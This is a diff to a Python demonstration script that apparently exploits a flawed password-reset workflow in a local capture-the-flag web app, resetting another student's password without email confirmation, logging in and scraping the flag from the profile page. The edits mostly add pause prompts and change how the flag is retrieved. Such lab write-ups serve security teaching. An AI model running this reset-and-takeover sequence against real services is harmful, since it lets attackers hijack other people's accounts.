@@ -11,6 +11,16 @@ CYAN = "\033[96m"
 RESET = "\033[0m"
 
 #login and get session cookie
+print("Demonstrating Password Reset 'Workflow'")
+input(f"{GREEN}press anything to continue")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"CONTINUING.")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"___________________________________________________________________________________________{RESET}")
+
 print(f"{CYAN}--- requesting a password reset for benjamin@student.42.tech ---{RESET}")
 email = "benjamin@student.42.tech"
 auth = requests.post(
@@ -32,6 +42,15 @@ print("token:", token)
 response = requests.get(
         "http://localhost:4942" + location
     )
+
+input(f"{GREEN}press anything to continue ")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"CONTINUING.")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"___________________________________________________________________________________________{RESET}")
 print("__________")
 print(f"{CYAN}--- furthermore, the very next redirect is the site asking us what to set the new password to, without waiting for a confirmation from the actual email (bad) ---{RESET}")
 print("response text of resetting benjamins password:\n")
@@ -62,7 +81,14 @@ newpass = requests.post(
     allow_redirects=False
 )
 
-
+input(f"{GREEN}press anything to continue")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"CONTINUING.")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"___________________________________________________________________________________________{RESET}")
 print("status:", newpass.status_code)
 print("location:", newpass.headers.get("location"))
 print(newpass.text[:200])
@@ -85,22 +111,29 @@ if not cookies.get("session"):
 print(f"{GREEN}Logged in successfully with " + email + " and " + new_password)
 
 
-print(f"{CYAN}--- now for some reason, the actual flag for this vulnerability isn't that obvious to find, i found it in the backend(which we'll get into later), as well as in the api patch profile ---{RESET}")
+print(f"{CYAN}--- Flag can be found in the 'Recovery Code' Section of the Userprofile ---{RESET}")
 
 
-response = requests.patch(
-        "http://localhost:4942/api/profile",
+response = requests.get(
+        "http://localhost:4942/profile/me/settings",
         cookies=cookies,
         headers={
             "Origin": "http://localhost:4942",
             "Referer": "http://localhost:4942",
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
         },
-		json={"role": "student"},
         allow_redirects=False
     )
-print("__________")
-print("response text of patch profile:\n")
-print(response.text)
-print(response.status_code)
-print("__________")
+
+
+from bs4 import BeautifulSoup
+
+soup = BeautifulSoup(response.text, "html.parser")
+
+cell = soup.find("div", class_="card-title", string="Account recovery code")
+
+if cell:
+    card = cell.parent
+    print(card.get_text(separator="\n", strip=True))
+else:
+    print("ohno")
